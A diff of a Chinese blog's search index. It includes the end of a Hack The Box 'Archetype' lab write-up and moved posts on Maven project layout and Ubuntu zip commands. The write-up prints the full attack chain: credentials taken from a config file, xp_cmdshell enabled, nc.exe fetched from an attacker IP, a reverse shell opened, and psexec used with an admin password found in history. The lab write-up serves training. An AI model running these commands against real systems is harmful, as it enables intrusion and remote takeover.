-<h2 id="详细记录"><a href="#详细记录" class="headerlink" title="详细记录"></a>详细记录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 09:00 EDT</span><br><span class="line">Warning: 10.129.129.122 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.129.129.122</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49668/tcp open  unknown</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line"></span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line">Password for [WORKGROUP\zyu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        backups         Disk</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.129.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;</span><br><span class="line">    &lt;/DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br><span class="line">    &lt;/Configuration&gt;</span><br><span class="line">&lt;/DTSConfiguration&gt; </span><br><span class="line"></span><br><span class="line">Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</span><br><span class="line"></span><br><span class="line">sudo python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt;</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; xp_cmdshell ‘net user’;</span><br><span class="line">ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure &#x27;sys.xp_cmdshell&#x27; of component &#x27;xp_cmdshell&#x27; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#x27;xp_cmdshell&#x27; by using sp_configure. For more information about enabling &#x27;xp_cmdshell&#x27;, search for &#x27;xp_cmdshell&#x27; in SQL Server Books Online.</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; SELECT is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell &#x27;net user&#x27;;</span><br><span class="line">output</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">User accounts for \\ARCHETYPE</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line"></span><br><span class="line">sql_svc                  WDAGUtilityAccount</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line"># 稳定反向shell获取</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=true</span><br><span class="line">mv &#x27;nc64.exe?raw=true&#x27; nc2.exe</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;</span><br><span class="line">C:\Users\sql_svc\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line"></span><br><span class="line">    PowerShell Settings</span><br><span class="line">    PowerShell v2 Version: 2.0</span><br><span class="line">    PowerShell v5 Version: 5.1.17763.1</span><br><span class="line">    PowerShell Core Version:</span><br><span class="line">    Transcription Settings:</span><br><span class="line">    Module Logging Settings:</span><br><span class="line">    Scriptblock Logging Settings:</span><br><span class="line">    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    PS history size: 79B</span><br><span class="line"></span><br><span class="line">Analyzing Windows Files Files (limit 70)</span><br><span class="line">    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    C:\Users\Default\NTUSER.DAT</span><br><span class="line">    C:\Users\sql_svc\NTUSER.DAT</span><br><span class="line"></span><br><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line">cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br><span class="line"></span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          .</span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          ..</span><br><span class="line">03/17/2020  02:36 AM                79 ConsoleHost_history.txt</span><br><span class="line">               1 File(s)             79 bytes</span><br><span class="line">               2 Dir(s)  10,754,007,040 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;type ConsoleHost_history.txt</span><br><span class="line">type ConsoleHost_history.txt</span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.129.95.187.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file hvfcrhtO.exe</span><br><span class="line">[*] Opening SVCManager on 10.129.95.187.....</span><br><span class="line">[*] Creating service aWaI on 10.129.95.187.....</span><br><span class="line">[*] Starting service aWaI.....</span><br><span class="line">[!] Press help for extra shell commands                                                                                                                        Microsoft Windows [Version 10.0.17763.2061]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop</span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir                                                                                                                             Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          .</span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/25/2020  07:36 AM                32 root.txt</span><br><span class="line">               1 File(s)             32 bytes</span><br><span class="line">               2 Dir(s)  10,328,911,872 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type root.txt </span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB</tag>
-        <tag>Penetration Testing</tag>
-        <tag>mssql</tag>
-        <tag>xp_cmdshell</tag>
-        <tag>nc.exe</tag>
       </tags>
   </entry>
   <entry>
@@ -2514,6 +2514,84 @@
       </tags>
   </entry>
   <entry>
+    <title>Java项目标准目录布局</title>
+    <url>/2026/01/27/Java%E9%A1%B9%E7%9B%AE%E6%A0%87%E5%87%86%E7%9B%AE%E5%BD%95%E5%B8%83%E5%B1%80/</url>
+    <content><![CDATA[<p>Java 生态系统中（特别是基于 <strong>Maven</strong> 和 <strong>Gradle</strong> 构建工具）通用的<strong>标准目录布局（Standard Directory Layout）</strong>是通用的，这里简单记录一下。</p>
+<p>这种“约定优于配置”（Convention over Configuration）的设计，使得任何接手项目的 Java 程序员都能第一时间知道代码在哪里，配置文件在哪里。</p>
+<h3 id="1-main-和-test-的核心区别"><a href="#1-main-和-test-的核心区别" class="headerlink" title="1. main 和 test 的核心区别"></a>1. <code>main</code> 和 <code>test</code> 的核心区别</h3><p>简单来说：<strong><code>main</code> 是给用户用的（生产环境），<code>test</code> 是给你自己用的（开发验证环境）。</strong></p>
+<h4 id="📂-src-main-主程序目录"><a href="#📂-src-main-主程序目录" class="headerlink" title="📂 src/main (主程序目录)"></a>📂 <code>src/main</code> (主程序目录)</h4><p>这是项目的<strong>核心</strong>。这里的代码和资源最终会被编译、打包（成 JAR 或 WAR 包），并部署到服务器或交付给客户。</p>
+<ul>
+<li><strong>作用</strong>：存放业务逻辑、应用程序配置、网页静态资源等。</li>
+<li><strong>后果</strong>：如果你在这里写了 bug，用户就会遇到 bug。</li>
+</ul>
+<h4 id="📂-src-test-测试程序目录"><a href="#📂-src-test-测试程序目录" class="headerlink" title="📂 src/test (测试程序目录)"></a>📂 <code>src/test</code> (测试程序目录)</h4><p>这是项目的<strong>质检部门</strong>。这里的代码是用来验证 <code>main</code> 里面的代码是否正确的。</p>
+<ul>
+<li><strong>作用</strong>：存放单元测试（Unit Tests）、集成测试、测试用的模拟数据等。</li>
+<li><strong>后果</strong>：这里的代码<strong>不会</strong>被打包到最终的发布版本中。它只在构建（Build）阶段运行。如果测试失败，项目通常会打包失败，从而防止 bug 上线。</li>
+</ul>
+<h3 id="2-标准-Maven-项目结构图"><a href="#2-标准-Maven-项目结构图" class="headerlink" title="2. 标准 Maven 项目结构图"></a>2. 标准 Maven 项目结构图</h3><p>一个标准的 Maven 项目结构通常如下所示：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">MyJavaProject/  (项目根目录)</span><br><span class="line">├── pom.xml                   &lt;-- 项目的身份证 (依赖管理、构建配置)</span><br><span class="line">├── src/</span><br><span class="line">│   ├── main/                 &lt;-- 【生产代码】</span><br><span class="line">│   │   ├── java/             &lt;-- 存放 .java 源代码</span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── example/</span><br><span class="line">│   │   │           └── MyApp.java</span><br><span class="line">│   │   │</span><br><span class="line">│   │   ├── resources/        &lt;-- 存放配置文件、静态资源</span><br><span class="line">│   │   │   ├── application.properties</span><br><span class="line">│   │   │   ├── my-config.xml</span><br><span class="line">│   │   │   └── static/       (如果是Web项目，可能放图片/js)</span><br><span class="line">│   │   │</span><br><span class="line">│   │   └── webapp/           &lt;-- (可选) 传统Web项目存放JSP/HTML的地方</span><br><span class="line">│   │</span><br><span class="line">│   └── test/                 &lt;-- 【测试代码】</span><br><span class="line">│       ├── java/             &lt;-- 存放测试用的 .java 代码</span><br><span class="line">│       │   └── com/</span><br><span class="line">│       │       └── example/</span><br><span class="line">│       │           └── MyAppTest.java</span><br><span class="line">│       │</span><br><span class="line">│       └── resources/        &lt;-- 存放测试专用的配置文件</span><br><span class="line">│           └── test-config.properties</span><br><span class="line">│</span><br><span class="line">└── target/                   &lt;-- 【自动生成】 构建输出目录</span><br><span class="line">    ├── classes/              (编译后的 main .class 文件)</span><br><span class="line">    ├── test-classes/         (编译后的 test .class 文件)</span><br><span class="line">    └── MyJavaProject.jar     (最终打包好的文件)</span><br></pre></td></tr></table></figure>
+<h3 id="3-详细目录解读"><a href="#3-详细目录解读" class="headerlink" title="3. 详细目录解读"></a>3. 详细目录解读</h3><h4 id="A-src-main-java"><a href="#A-src-main-java" class="headerlink" title="A. src/main/java"></a>A. <code>src/main/java</code></h4><ul>
+<li>这是你写 Java 业务代码的地方。</li>
+<li>通常需要按照包名（Package）建立文件夹结构，例如 <code>com.company.project</code>。</li>
+</ul>
+<h4 id="B-src-main-resources"><a href="#B-src-main-resources" class="headerlink" title="B. src/main/resources"></a>B. <code>src/main/resources</code></h4><ul>
+<li>存放<strong>非 Java 代码</strong>的文件。</li>
+<li><strong>常见内容</strong>：<ul>
+<li><code>application.properties</code> 或 <code>application.yml</code> (Spring Boot 配置文件)。</li>
+<li><code>log4j2.xml</code> / <code>logback.xml</code> (日志配置)。</li>
+<li>MyBatis 的 Mapper XML 文件。</li>
+<li>SSL 证书、国际化文件等。</li>
+</ul>
+</li>
+<li><strong>打包后</strong>：这些文件会被直接复制到 CLASSPATH 的根目录下。</li>
+</ul>
+<h4 id="C-src-test-java"><a href="#C-src-test-java" class="headerlink" title="C. src/test/java"></a>C. <code>src/test/java</code></h4><ul>
+<li>存放 JUnit 或 TestNG 的测试类。</li>
+<li><strong>最佳实践</strong>：这里的包路径通常与 <code>src/main/java</code> <strong>保持一致</strong>。<ul>
+<li>例如：主代码在 <code>com.example.service.UserService</code></li>
+<li>测试代码在 <code>com.example.service.UserServiceTest</code></li>
+<li>这样测试类可以直接访问主类中 <code>protected</code> 修饰的方法（包级私有）。</li>
+</ul>
+</li>
+</ul>
+<h4 id="D-src-test-resources"><a href="#D-src-test-resources" class="headerlink" title="D. src/test/resources"></a>D. <code>src/test/resources</code></h4><ul>
+<li>存放<strong>只在测试时生效</strong>的配置。</li>
+<li><strong>场景</strong>：<ul>
+<li>生产环境（<code>main/resources</code>）用的是 Oracle 数据库配置。</li>
+<li>测试环境（<code>test/resources</code>）为了速度，配置一个 H2 内存数据库。</li>
+</ul>
+</li>
+<li>测试运行时，这里的配置优先级通常会覆盖 main 里的配置，或者专门用于测试环境读取。</li>
+</ul>
+<h4 id="E-pom-xml-Project-Object-Model"><a href="#E-pom-xml-Project-Object-Model" class="headerlink" title="E. pom.xml (Project Object Model)"></a>E. <code>pom.xml</code> (Project Object Model)</h4><ul>
+<li>这是 Maven 项目的核心配置文件。</li>
+<li>它定义了：<ul>
+<li>项目的基本信息（groupId, artifactId, version）。</li>
+<li><strong>依赖（Dependencies）</strong>：你需要用到的第三方库（如 Spring, MySQL Driver, JUnit）。</li>
+<li><strong>插件（Plugins）</strong>：如何编译、如何打包、如何运行测试。</li>
+</ul>
+</li>
+</ul>
+<h4 id="F-target"><a href="#F-target" class="headerlink" title="F. target/"></a>F. <code>target/</code></h4><ul>
+<li>这是 Maven 自动生成的目录，<strong>不要手动去改里面的文件</strong>，也<strong>不要</strong>提交到 Git 仓库（应该在 <code>.gitignore</code> 中忽略它）。</li>
+<li>当你运行 <code>mvn clean</code> 时，这个文件夹会被删除。</li>
+<li>当你运行 <code>mvn package</code> 时，编译好的 <code>.class</code> 文件和最终的 <code>.jar</code> 包会出现在这里。</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><strong><code>main</code></strong> 是为了<strong>“跑起来”</strong></li>
+<li><strong><code>test</code></strong> 是为了<strong>“跑得稳”</strong></li>
+<li><strong>Maven 结构</strong> 是一种全行业通用的“收纳整理术”，遵守这个结构，你的项目在任何 IDE（IntelliJ IDEA, Eclipse, VS Code）里都能被自动识别并正确运行。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java漏洞靶场搭建学习(一)：环境搭建与Springboot架构</title>
     <url>/2025/12/09/Java%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8ESpringboot%E6%9E%B6%E6%9E%84/</url>
     <content><![CDATA[<h1 id="Java漏洞靶场搭建学习"><a href="#Java漏洞靶场搭建学习" class="headerlink" title="Java漏洞靶场搭建学习"></a>Java漏洞靶场搭建学习</h1><p>在学习 Java Web 安全的过程中，目前状态是只能理解相关的漏洞原理，根据 PoC 做题或者复现漏洞，但是这些对于 <strong>代码审计、漏洞挖掘、SDL</strong> 等都没有实质性帮助，想要在学习或工作过程中提升相关能力，计划实现以下目标：</p>
@@ -2621,84 +2699,6 @@
       <tags>
         <tag>Java Security</tag>
         <tag>Springboot</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java项目标准目录布局</title>
-    <url>/2026/01/27/Java%E9%A1%B9%E7%9B%AE%E6%A0%87%E5%87%86%E7%9B%AE%E5%BD%95%E5%B8%83%E5%B1%80/</url>
-    <content><![CDATA[<p>Java 生态系统中（特别是基于 <strong>Maven</strong> 和 <strong>Gradle</strong> 构建工具）通用的<strong>标准目录布局（Standard Directory Layout）</strong>是通用的，这里简单记录一下。</p>
-<p>这种“约定优于配置”（Convention over Configuration）的设计，使得任何接手项目的 Java 程序员都能第一时间知道代码在哪里，配置文件在哪里。</p>
-<h3 id="1-main-和-test-的核心区别"><a href="#1-main-和-test-的核心区别" class="headerlink" title="1. main 和 test 的核心区别"></a>1. <code>main</code> 和 <code>test</code> 的核心区别</h3><p>简单来说：<strong><code>main</code> 是给用户用的（生产环境），<code>test</code> 是给你自己用的（开发验证环境）。</strong></p>
-<h4 id="📂-src-main-主程序目录"><a href="#📂-src-main-主程序目录" class="headerlink" title="📂 src/main (主程序目录)"></a>📂 <code>src/main</code> (主程序目录)</h4><p>这是项目的<strong>核心</strong>。这里的代码和资源最终会被编译、打包（成 JAR 或 WAR 包），并部署到服务器或交付给客户。</p>
-<ul>
-<li><strong>作用</strong>：存放业务逻辑、应用程序配置、网页静态资源等。</li>
-<li><strong>后果</strong>：如果你在这里写了 bug，用户就会遇到 bug。</li>
-</ul>
-<h4 id="📂-src-test-测试程序目录"><a href="#📂-src-test-测试程序目录" class="headerlink" title="📂 src/test (测试程序目录)"></a>📂 <code>src/test</code> (测试程序目录)</h4><p>这是项目的<strong>质检部门</strong>。这里的代码是用来验证 <code>main</code> 里面的代码是否正确的。</p>
-<ul>
-<li><strong>作用</strong>：存放单元测试（Unit Tests）、集成测试、测试用的模拟数据等。</li>
-<li><strong>后果</strong>：这里的代码<strong>不会</strong>被打包到最终的发布版本中。它只在构建（Build）阶段运行。如果测试失败，项目通常会打包失败，从而防止 bug 上线。</li>
-</ul>
-<h3 id="2-标准-Maven-项目结构图"><a href="#2-标准-Maven-项目结构图" class="headerlink" title="2. 标准 Maven 项目结构图"></a>2. 标准 Maven 项目结构图</h3><p>一个标准的 Maven 项目结构通常如下所示：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">MyJavaProject/  (项目根目录)</span><br><span class="line">├── pom.xml                   &lt;-- 项目的身份证 (依赖管理、构建配置)</span><br><span class="line">├── src/</span><br><span class="line">│   ├── main/                 &lt;-- 【生产代码】</span><br><span class="line">│   │   ├── java/             &lt;-- 存放 .java 源代码</span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── example/</span><br><span class="line">│   │   │           └── MyApp.java</span><br><span class="line">│   │   │</span><br><span class="line">│   │   ├── resources/        &lt;-- 存放配置文件、静态资源</span><br><span class="line">│   │   │   ├── application.properties</span><br><span class="line">│   │   │   ├── my-config.xml</span><br><span class="line">│   │   │   └── static/       (如果是Web项目，可能放图片/js)</span><br><span class="line">│   │   │</span><br><span class="line">│   │   └── webapp/           &lt;-- (可选) 传统Web项目存放JSP/HTML的地方</span><br><span class="line">│   │</span><br><span class="line">│   └── test/                 &lt;-- 【测试代码】</span><br><span class="line">│       ├── java/             &lt;-- 存放测试用的 .java 代码</span><br><span class="line">│       │   └── com/</span><br><span class="line">│       │       └── example/</span><br><span class="line">│       │           └── MyAppTest.java</span><br><span class="line">│       │</span><br><span class="line">│       └── resources/        &lt;-- 存放测试专用的配置文件</span><br><span class="line">│           └── test-config.properties</span><br><span class="line">│</span><br><span class="line">└── target/                   &lt;-- 【自动生成】 构建输出目录</span><br><span class="line">    ├── classes/              (编译后的 main .class 文件)</span><br><span class="line">    ├── test-classes/         (编译后的 test .class 文件)</span><br><span class="line">    └── MyJavaProject.jar     (最终打包好的文件)</span><br></pre></td></tr></table></figure>
-<h3 id="3-详细目录解读"><a href="#3-详细目录解读" class="headerlink" title="3. 详细目录解读"></a>3. 详细目录解读</h3><h4 id="A-src-main-java"><a href="#A-src-main-java" class="headerlink" title="A. src/main/java"></a>A. <code>src/main/java</code></h4><ul>
-<li>这是你写 Java 业务代码的地方。</li>
-<li>通常需要按照包名（Package）建立文件夹结构，例如 <code>com.company.project</code>。</li>
-</ul>
-<h4 id="B-src-main-resources"><a href="#B-src-main-resources" class="headerlink" title="B. src/main/resources"></a>B. <code>src/main/resources</code></h4><ul>
-<li>存放<strong>非 Java 代码</strong>的文件。</li>
-<li><strong>常见内容</strong>：<ul>
-<li><code>application.properties</code> 或 <code>application.yml</code> (Spring Boot 配置文件)。</li>
-<li><code>log4j2.xml</code> / <code>logback.xml</code> (日志配置)。</li>
-<li>MyBatis 的 Mapper XML 文件。</li>
-<li>SSL 证书、国际化文件等。</li>
-</ul>
-</li>
-<li><strong>打包后</strong>：这些文件会被直接复制到 CLASSPATH 的根目录下。</li>
-</ul>
-<h4 id="C-src-test-java"><a href="#C-src-test-java" class="headerlink" title="C. src/test/java"></a>C. <code>src/test/java</code></h4><ul>
-<li>存放 JUnit 或 TestNG 的测试类。</li>
-<li><strong>最佳实践</strong>：这里的包路径通常与 <code>src/main/java</code> <strong>保持一致</strong>。<ul>
-<li>例如：主代码在 <code>com.example.service.UserService</code></li>
-<li>测试代码在 <code>com.example.service.UserServiceTest</code></li>
-<li>这样测试类可以直接访问主类中 <code>protected</code> 修饰的方法（包级私有）。</li>
-</ul>
-</li>
-</ul>
-<h4 id="D-src-test-resources"><a href="#D-src-test-resources" class="headerlink" title="D. src/test/resources"></a>D. <code>src/test/resources</code></h4><ul>
-<li>存放<strong>只在测试时生效</strong>的配置。</li>
-<li><strong>场景</strong>：<ul>
-<li>生产环境（<code>main/resources</code>）用的是 Oracle 数据库配置。</li>
-<li>测试环境（<code>test/resources</code>）为了速度，配置一个 H2 内存数据库。</li>
-</ul>
-</li>
-<li>测试运行时，这里的配置优先级通常会覆盖 main 里的配置，或者专门用于测试环境读取。</li>
-</ul>
-<h4 id="E-pom-xml-Project-Object-Model"><a href="#E-pom-xml-Project-Object-Model" class="headerlink" title="E. pom.xml (Project Object Model)"></a>E. <code>pom.xml</code> (Project Object Model)</h4><ul>
-<li>这是 Maven 项目的核心配置文件。</li>
-<li>它定义了：<ul>
-<li>项目的基本信息（groupId, artifactId, version）。</li>
-<li><strong>依赖（Dependencies）</strong>：你需要用到的第三方库（如 Spring, MySQL Driver, JUnit）。</li>
-<li><strong>插件（Plugins）</strong>：如何编译、如何打包、如何运行测试。</li>
-</ul>
-</li>
-</ul>
-<h4 id="F-target"><a href="#F-target" class="headerlink" title="F. target/"></a>F. <code>target/</code></h4><ul>
-<li>这是 Maven 自动生成的目录，<strong>不要手动去改里面的文件</strong>，也<strong>不要</strong>提交到 Git 仓库（应该在 <code>.gitignore</code> 中忽略它）。</li>
-<li>当你运行 <code>mvn clean</code> 时，这个文件夹会被删除。</li>
-<li>当你运行 <code>mvn package</code> 时，编译好的 <code>.class</code> 文件和最终的 <code>.jar</code> 包会出现在这里。</li>
-</ul>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li><strong><code>main</code></strong> 是为了<strong>“跑起来”</strong></li>
-<li><strong><code>test</code></strong> 是为了<strong>“跑得稳”</strong></li>
-<li><strong>Maven 结构</strong> 是一种全行业通用的“收纳整理术”，遵守这个结构，你的项目在任何 IDE（IntelliJ IDEA, Eclipse, VS Code）里都能被自动识别并正确运行。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -3760,6 +3760,51 @@
       </tags>
   </entry>
   <entry>
+    <title>Ubuntu下的压缩和解压缩</title>
+    <url>/2026/01/27/Ubuntu%E4%B8%8B%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9/</url>
+    <content><![CDATA[<p>Ubuntu 下使用 <code>zip</code> 和 <code>unzip</code> 的实用指南：</p>
+<h3 id="0-确保已安装"><a href="#0-确保已安装" class="headerlink" title="0. 确保已安装"></a>0. 确保已安装</h3><p>如果命令不存在，先安装：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zip unzip</span><br></pre></td></tr></table></figure></p>
+<h3 id="1-压缩-zip"><a href="#1-压缩-zip" class="headerlink" title="1. 压缩 (zip)"></a>1. 压缩 (zip)</h3><p><strong>语法：</strong> <code>zip [参数] [生成的压缩包名] [要压缩的文件/目录]</code></p>
+<ul>
+<li><p><strong>压缩单个文件</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip output.zip file.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>压缩目录（最常用，必须加 <code>-r</code>）</strong>：<br><code>-r</code> 代表递归，如果不加，只会打包空文件夹。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -r website.zip /var/www/html</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>压缩多个文件</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip data.zip file1.txt file2.jpg file3.png</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>加密压缩</strong>（会提示输入密码）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -e secret.zip file.txt</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-解压-unzip"><a href="#2-解压-unzip" class="headerlink" title="2. 解压 (unzip)"></a>2. 解压 (unzip)</h3><p><strong>语法：</strong> <code>unzip [压缩包名] [参数]</code></p>
+<ul>
+<li><p><strong>解压到当前目录</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip file.zip</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>解压到指定目录（最常用，必须加 <code>-d</code>）</strong>：<br><code>-d</code> 代表 destination（目标）。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip file.zip -d /opt/myapp/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>只查看内容不解压</strong>：</p>
